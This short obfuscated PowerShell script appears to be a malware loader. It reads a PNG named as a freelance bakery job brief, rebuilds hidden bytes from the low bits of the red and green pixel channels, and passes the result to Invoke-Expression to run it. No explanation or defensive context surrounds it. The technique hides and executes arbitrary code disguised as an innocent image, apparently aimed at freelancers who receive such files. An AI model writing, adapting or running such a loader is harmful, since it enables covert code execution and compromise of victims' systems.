sal a New-Object;Add-Type -A System.Drawing;
$g=a System.Drawing.Bitmap("Bakery_idea_and_details_for_freelance.png");
$o=a Byte[] 1572864;
(0..1535)|%{
    foreach($x in 0..1023) {
        $p=$g.GetPixel($x, $_);
        $o[$_*1024+$x]=[math]::Floor(($p.R -band 0x0F)*16) + ($p.G -band 0x0F);
    }
};
$g.Dispose();
IEX([System.Text.Encoding]::ASCII.GetString($o[0..103]))